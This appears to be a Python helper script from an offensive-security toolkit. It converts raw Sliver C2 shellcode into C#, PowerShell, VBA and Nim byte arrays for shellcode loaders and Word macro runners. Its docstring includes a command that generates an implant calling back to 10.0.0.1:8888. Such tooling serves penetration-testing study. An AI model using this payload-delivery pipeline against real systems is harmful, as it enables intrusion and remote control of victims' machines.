#!/usr/bin/env python3
"""
sliver2arrays.py — Convert Sliver raw shellcode (binary) into byte-array syntax
for the osep-tools loaders (C#, PowerShell, VBA, Nim).

Why this exists:
    The existing osep-tools encryptors/loaders expect shellcode pasted as a
    C# / PowerShell / VBA byte array (previously generated with
    `msfvenom -f csharp` / `-f ps1`). Sliver's `--format shellcode` emits raw
    binary, so this script converts it into the array syntax each loader needs.

Usage:
    # 1. Generate Sliver raw shellcode (or use --format raw)
    sliver > generate --mtls 10.0.0.1:8888 --format shellcode --save /tmp/sc.bin

    # 2. Convert to the format your loader expects
    python3 sliver2arrays.py /tmp/sc.bin --csharp      # -> paste into aes-shellcode-encryption.cs
    python3 sliver2arrays.py /tmp/sc.bin --ps1         # -> paste into ps-shellcode-runner.ps1
    python3 sliver2arrays.py /tmp/sc.bin --vba         # -> paste into word-macro runners
    python3 sliver2arrays.py /tmp/sc.bin --nim         # -> paste into a Nim loader
    python3 sliver2arrays.py /tmp/sc.bin --all         # print every format
"""

import argparse
import sys


def to_csharp(data, per_line=12):
    lines = [f"byte[] buf = new byte[{len(data)}] {{"]
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        body = ", ".join(f"0x{b:02x}" for b in chunk)
        if i + per_line < len(data):
            body += ","
        lines.append("    " + body)
    lines.append("};")
    return "\n".join(lines)


def to_ps1(data):
    return "[Byte[]] $buf = " + ",".join(f"0x{b:02x}" for b in data)


def to_vba(data, per_line=35):
    # VBA uses a trailing " _" (space + underscore) for line continuation
    out = ["buf = Array("]
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        body = ", ".join(str(b) for b in chunk)
        if i + per_line < len(data):
            body += ", _"
        out.append("    " + body)
    out.append(")")
    return "\n".join(out)


def to_nim(data, per_line=16):
    lines = [f"var buf: array[{len(data)}, byte] = ["]
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        body = ", ".join(f"byte 0x{b:02x}" for b in chunk)
        if i + per_line < len(data):
            body += ","
        lines.append("  " + body)
    lines.append("]")
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(description="Convert raw shellcode to loader byte-array syntax")
    parser.add_argument("input", help="Path to raw shellcode binary file")
    parser.add_argument("--csharp", action="store_true", help="C# byte array")
    parser.add_argument("--ps1", action="store_true", help="PowerShell byte array")
    parser.add_argument("--vba", action="store_true", help="VBA decimal Array(...)")
    parser.add_argument("--nim", action="store_true", help="Nim byte array")
    parser.add_argument("--all", action="store_true", help="Output every format")
    args = parser.parse_args()

    try:
        with open(args.input, "rb") as f:
            data = f.read()
    except OSError as e:
        sys.exit(f"[!] Cannot read {args.input}: {e}")

    if not data:
        sys.exit("[!] Input file is empty.")

    formats = {
        "--csharp": ("C#", to_csharp(data)),
        "--ps1": ("PowerShell", to_ps1(data)),
        "--vba": ("VBA", to_vba(data)),
        "--nim": ("Nim", to_nim(data)),
    }

    selected = [k for k in formats if getattr(args, k[2:])]
    if args.all or not selected:
        selected = list(formats)

    for i, key in enumerate(selected):
        label, text = formats[key]
        print(f"# ---- {label} ({len(data)} bytes) ----")
        print(text)
        if i < len(selected) - 1:
            print()


if __name__ == "__main__":
    main()
